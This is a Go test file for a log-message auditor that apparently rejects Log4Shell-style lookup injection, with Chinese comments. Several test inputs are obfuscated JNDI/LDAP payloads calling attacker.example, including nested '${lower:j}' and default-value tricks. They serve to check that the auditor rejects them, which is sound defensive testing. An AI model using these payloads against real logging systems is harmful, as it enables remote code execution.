package netsec

import (
	"strings"
	"testing"
	"time"
)

var fakeNow = time.Date(2026, 11, 13, 8, 30, 0, 0, time.UTC)

func testConfig() Config {
	return Config{
		Lookups: DefaultLookups(map[string]string{
			"HOME": "/home/sandbox",
			"BIG":  strings.Repeat("A", 64),
		}, fakeNow),
		MaxDepth:  8,
		MaxLength: 1024,
	}
}

func wantReject(t *testing.T, msg string, cfg Config, want Reason) {
	t.Helper()
	_, err := AuditMessage(msg, cfg)
	if err == nil {
		t.Fatalf("AuditMessage(%q) passed, want reject %s", msg, want)
	}
	re, ok := AsReject(err)
	if !ok {
		t.Fatalf("AuditMessage(%q) error %v is not a RejectError", msg, err)
	}
	if re.Reason != want {
		t.Fatalf("AuditMessage(%q) rejected with %s, want %s (detail: %s)", msg, re.Reason, want, re.Detail)
	}
}

func wantPass(t *testing.T, msg string, cfg Config, want string) {
	t.Helper()
	got, err := AuditMessage(msg, cfg)
	if err != nil {
		t.Fatalf("AuditMessage(%q) rejected: %v", msg, err)
	}
	if got != want {
		t.Fatalf("AuditMessage(%q) = %q, want %q", msg, got, want)
	}
}

func TestNestedLowerJNDIRejected(t *testing.T) {
	// 经典 Log4Shell 混淆：${lower:j} 展开后拼出 jndi 前缀。
	wantReject(t, `${${lower:j}ndi:ldap://attacker.example/x}`, testConfig(), ReasonJNDI)
	wantReject(t, `${${lower:J}ndi:ldap://attacker.example/x}`, testConfig(), ReasonJNDI)
	// 大小写混合绕过也不能通过。
	wantReject(t, `${${lower:Jn}Di:ldap://attacker.example/x}`, testConfig(), ReasonJNDI)
}

func TestDefaultValueHidesJNDIRejected(t *testing.T) {
	// 默认值语法内直接藏 jndi。
	wantReject(t, `${env:NOT_SET:-jndi:ldap://attacker.example/x}`, testConfig(), ReasonJNDI)
	// 默认值里再嵌套一层 lower 拼出 jndi。
	wantReject(t, `${env:NOT_SET:-${lower:j}ndi:ldap://attacker.example/x}`, testConfig(), ReasonJNDI)
	// 消息原文直接出现 jndi 同样拒绝。
	wantReject(t, `plain jndi:ldap://attacker.example/x`, testConfig(), ReasonJNDI)
}

func TestUnbalancedBracesRejected(t *testing.T) {
	wantReject(t, `user ${env:HOME`, testConfig(), ReasonUnbalanced)
	wantReject(t, `}${env:HOME}`, testConfig(), ReasonUnbalanced)
	wantReject(t, `${env:HOME}}`, testConfig(), ReasonUnbalanced)
	wantReject(t, `${env:${lower:HOME}`, testConfig(), ReasonUnbalanced)
}

func TestNormalEnvLookupPasses(t *testing.T) {
	wantPass(t, `home is ${env:HOME}`, testConfig(), "home is /home/sandbox")
	wantPass(t, `${env:MISSING:-fallback}`, testConfig(), "fallback")
	wantPass(t, `${lower:HeLLo} ${upper:world}`, testConfig(), "hello WORLD")
	wantPass(t, `ts=${date:2006-01-02}`, testConfig(), "ts=2026-11-13")
	wantPass(t, `no lookups at all`, testConfig(), "no lookups at all")
	// 嵌套白名单前缀正常由内向外展开。
	wantPass(t, `${lower:${upper:abc}}`, testConfig(), "abc")
}

func TestUnknownPrefixRejected(t *testing.T) {
	wantReject(t, `${foo:bar}`, testConfig(), ReasonUnknownPrefix)
	wantReject(t, `${:bar}`, testConfig(), ReasonUnknownPrefix)
	wantReject(t, `${sys:user.name}`, testConfig(), ReasonUnknownPrefix)
}

func TestDepthBudgetRejected(t *testing.T) {
	deep := strings.Repeat("${lower:", 10) + "x" + strings.Repeat("}", 10)
	wantReject(t, deep, testConfig(), ReasonDepthExceeded)

	cfg := testConfig()
	cfg.MaxDepth = 2
	wantReject(t, `${lower:${upper:${lower:x}}}`, cfg, ReasonDepthExceeded)
	wantPass(t, `${lower:${upper:x}}`, cfg, "x")
}

func TestLengthBudgetRejected(t *testing.T) {
	cfg := testConfig()
	cfg.MaxLength = 32
	// 展开后超出预算。
	wantReject(t, `pad ${env:BIG}`, cfg, ReasonLengthExceeded)
	// 原文已超预算。
	wantReject(t, strings.Repeat("x", 40), cfg, ReasonLengthExceeded)
	// 预算内正常通过。
	wantPass(t, `${env:HOME}`, cfg, "/home/sandbox")
}
